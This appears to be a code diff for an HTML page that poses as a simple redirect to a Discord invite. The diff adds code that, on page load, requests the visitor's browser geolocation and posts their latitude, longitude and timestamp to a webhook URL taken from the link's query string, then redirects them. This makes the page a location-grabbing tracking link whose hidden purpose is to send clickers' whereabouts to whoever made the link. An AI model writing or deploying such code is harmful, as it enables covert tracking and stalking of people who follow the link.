@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect to Discord and Send Webhook</title>
+    <title>Redirect to Discord and Send Location</title>
 </head>
 <body>
     <script>
@@ -11,20 +11,21 @@
         const urlParams = new URLSearchParams(window.location.search);
         const webhookUrl = urlParams.get('webhook');
 
-        if (webhookUrl) {
-            // Optional: You can send some data to the webhook (e.g., location, state, or city)
-            const data = {
-                message: "User has clicked the link!", // Example message, you can customize this
+        // Function to send the location data to the webhook
+        function sendLocationToWebhook(latitude, longitude) {
+            const locationData = {
+                latitude: latitude,
+                longitude: longitude,
                 timestamp: new Date().toISOString()
             };
 
-            // Send a POST request to the webhook
+            // Send the location data to the provided webhook URL
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(locationData)
             }).then(response => {
                 if (response.ok) {
                     console.log("Webhook sent successfully!");
@@ -36,8 +37,30 @@
             });
         }
 
-        // Immediately redirect the user to the Discord invite link
-        window.location.href = "https://discord.gg/perkbios"; // Change this if you want a different link
+        // Check if geolocation is available in the browser
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                // Get the latitude and longitude
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Send location data to the webhook
+                if (webhookUrl) {
+                    sendLocationToWebhook(latitude, longitude);
+                }
+
+                // Redirect to the Discord invite link
+                window.location.href = "https://discord.gg/perkbios";
+            }, function(error) {
+                console.error("Geolocation error:", error);
+                // If there is an error, still redirect to the Discord invite
+                window.location.href = "https://discord.gg/perkbios";
+            });
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+            // If geolocation isn't supported, still redirect to the Discord invite
+            window.location.href = "https://discord.gg/perkbios";
+        }
     </script>
 </body>
 </html>
